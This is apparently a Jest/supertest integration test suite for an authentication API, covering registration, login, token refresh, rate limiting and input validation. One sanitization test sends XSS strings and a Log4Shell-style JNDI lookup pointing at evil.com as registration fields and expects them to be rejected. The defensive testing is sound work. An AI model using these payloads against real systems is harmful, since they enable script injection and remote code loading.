import request from 'supertest';
import bcrypt from 'bcryptjs';

const SERVER_URL: string = process.env.AUTH_SERVICE_URL || 'http://localhost:3000';

interface User {
  id: string;
  email: string;
  firstName: string;
  lastName: string;
  phoneNumber?: string;
}

describe('Auth Service Integration Tests', () => {
  let testUser: User | undefined;
  let accessToken: string | undefined;
  let refreshTokenCookie: string | undefined;
  const app: string = SERVER_URL;

  beforeAll(async () => {
    await request(app).post('/api/v1/test/reset').expect(200);
  });

  describe('Complete Auth Flow', () => {
    it('should complete full registration -> login -> profile -> logout flow', async () => {
      const registrationData = {
        email: 'integration@test.com',
        password: 'Password123!',
        firstName: 'Integration',
        lastName: 'Test',
      };

      const registerResponse = await request(app)
        .post('/api/v1/auth/register')
        .send(registrationData)
        .expect(201);

      expect(registerResponse.body.success).toBe(true);
      expect(registerResponse.body.data.user.email).toBe(registrationData.email);

      const setCookieHeader = registerResponse.headers['set-cookie'] as string[] | undefined;
      refreshTokenCookie = setCookieHeader?.find(cookie => cookie.startsWith('refreshToken='));

      accessToken = registerResponse.body.data.tokens.accessToken;
      testUser = registerResponse.body.data.user;

      const profileResponse = await request(app)
        .get('/api/v1/auth/profile')
        .set('Authorization', `Bearer ${accessToken}`)
        .expect(200);

      expect(profileResponse.body.data.user.email).toBe(registrationData.email);

      const updateData = {
        firstName: 'UpdatedName',
        phoneNumber: '+1234567890',
      };

      const updateResponse = await request(app)
        .put('/api/v1/auth/profile')
        .set('Authorization', `Bearer ${accessToken}`)
        .send(updateData)
        .expect(200);

      expect(updateResponse.body.data.user.firstName).toBe('UpdatedName');
      expect(updateResponse.body.data.user.phoneNumber).toBe('+1234567890');

      const changePasswordResponse = await request(app)
        .post('/api/v1/auth/change-password')
        .set('Authorization', `Bearer ${accessToken}`)
        .send({
          currentPassword: 'Password123!',
          newPassword: 'NewPassword123!',
        })
        .expect(200);

      expect(changePasswordResponse.body.success).toBe(true);

      const loginResponse = await request(app)
        .post('/api/v1/auth/login')
        .send({
          email: registrationData.email,
          password: 'NewPassword123!',
        })
        .expect(200);

      expect(loginResponse.body.success).toBe(true);

      const newAccessToken = loginResponse.body.data.tokens.accessToken;
      const newRefreshCookie = (loginResponse.headers['set-cookie'] as string[] | undefined)?.find(cookie =>
        cookie.startsWith('refreshToken=')
      );

      const logoutResponse = await request(app)
        .post('/api/v1/auth/logout')
        .set('Cookie', newRefreshCookie as string)
        .expect(200);

      expect(logoutResponse.body.success).toBe(true);

      await request(app)
        .get('/api/v1/auth/profile')
        .set('Authorization', `Bearer ${newAccessToken}`)
        .expect(401);
    }, 30000);

    it('should handle refresh token flow correctly', async () => {
      const userData = {
        email: 'refresh@test.com',
        password: 'Password123!',
        firstName: 'Refresh',
        lastName: 'User',
      };

      const registerResponse = await request(app)
        .post('/api/v1/auth/register')
        .send(userData)
        .expect(201);

      const initialRefreshCookie = (registerResponse.headers['set-cookie'] as string[] | undefined)?.find(cookie =>
        cookie.startsWith('refreshToken=')
      );

      const refreshResponse = await request(app)
        .post('/api/v1/auth/refresh')
        .set('Cookie', initialRefreshCookie as string)
        .expect(200);

      expect(refreshResponse.body.success).toBe(true);
      expect(refreshResponse.body.data.tokens.accessToken).toBeDefined();

      const newAccessToken = refreshResponse.body.data.tokens.accessToken;
      const newRefreshCookie = (refreshResponse.headers['set-cookie'] as string[] | undefined)?.find(cookie =>
        cookie.startsWith('refreshToken=')
      );

      const profileResponse = await request(app)
        .get('/api/v1/auth/profile')
        .set('Authorization', `Bearer ${newAccessToken}`)
        .expect(200);

      expect(profileResponse.body.data.user.email).toBe(userData.email);

      await request(app)
        .post('/api/v1/auth/refresh')
        .set('Cookie', initialRefreshCookie as string)
        .expect(401);
    }, 20000);

    it('should handle remember me functionality', async () => {
      const loginData = {
        email: 'integration@test.com',
        password: 'NewPassword123!',
        rememberMe: true,
      };

      const loginResponse = await request(app)
        .post('/api/v1/auth/login')
        .send(loginData)
        .expect(200);

      const refreshCookie = (loginResponse.headers['set-cookie'] as string[] | undefined)?.find(cookie =>
        cookie.startsWith('refreshToken=')
      );

      expect(refreshCookie).toEqual(expect.stringContaining('Max-Age=2592000'));

      const shortLoginResponse = await request(app)
        .post('/api/v1/auth/login')
        .send({ ...loginData, rememberMe: false })
        .expect(200);

      const shortRefreshCookie = (shortLoginResponse.headers['set-cookie'] as string[] | undefined)?.find(cookie =>
        cookie.startsWith('refreshToken=')
      );

      expect(shortRefreshCookie).toEqual(expect.stringContaining('Max-Age=604800'));
    }, 15000);
  });

  describe('Security Tests', () => {
    it('should reject requests with malformed tokens', async () => {
      const malformedTokens = [
        'Bearer invalid.token.format',
        'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid',
        'Bearer not-even-close',
        'Bearer ',
        ''
      ];

      for (const token of malformedTokens) {
        await request(app)
          .get('/api/v1/auth/profile')
          .set('Authorization', token)
          .expect(401);
      }
    }, 15000);

    it('should validate input sanitization', async () => {
      const maliciousInputs = {
        email: '<script>alert("xss")</script>@test.com',
        firstName: '<img src=x onerror=alert("xss")>',
        lastName: '${jndi:ldap://evil.com/a}',
        phoneNumber: '+1<script>alert("xss")</script>',
        password: 'ValidPass123!'
      };

      await request(app)
        .post('/api/v1/auth/register')
        .send(maliciousInputs)
        .expect(400);
    }, 10000);

    it('should enforce rate limiting', async () => {
      const requests = [];
      
      for (let i = 0; i < 10; i++) {
        requests.push(
          request(app)
            .post('/api/v1/auth/login')
            .send({
              email: 'nonexistent@test.com',
              password: 'wrongpassword'
            })
        );
      }

      const responses = await Promise.all(requests);
      
      const rateLimitedResponses = responses.filter(r => r.status === 429);
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
    }, 15000);

    it('should handle duplicate email registration', async () => {
      const userData = {
        email: 'duplicate@test.com',
        password: 'Password123!',
        firstName: 'Duplicate',
        lastName: 'User',
      };

      await request(app)
        .post('/api/v1/auth/register')
        .send(userData)
        .expect(201);

      await request(app)
        .post('/api/v1/auth/register')
        .send(userData)
        .expect(409); 
    }, 10000);

    it('should validate password requirements', async () => {
      const weakPasswords = [
        'weak',
        '123456',
        'password',
        'Pass123', 
        'password123!', 
        'PASSWORD123!', 
      ];

      for (const password of weakPasswords) {
        await request(app)
          .post('/api/v1/auth/register')
          .send({
            email: `test${Date.now()}@test.com`,
            password: password,
            firstName: 'Test',
            lastName: 'User'
          })
          .expect(400);
      }
    }, 15000);
  });

  describe('Error Handling', () => {
    it('should handle invalid login credentials', async () => {
      await request(app)
        .post('/api/v1/auth/login')
        .send({
          email: 'nonexistent@test.com',
          password: 'wrongpassword'
        })
        .expect(401);
    });

    it('should handle missing required fields', async () => {
      await request(app)
        .post('/api/v1/auth/register')
        .send({
          password: 'Password123!',
          firstName: 'Test',
          lastName: 'User'
        })
        .expect(400);

      await request(app)
        .post('/api/v1/auth/login')
        .send({
          email: 'test@test.com'
        })
        .expect(400);
    });

    it('should handle expired or invalid refresh tokens', async () => {
      await request(app)
        .post('/api/v1/auth/refresh')
        .set('Cookie', 'refreshToken=invalid-token')
        .expect(401);
    });
  });
});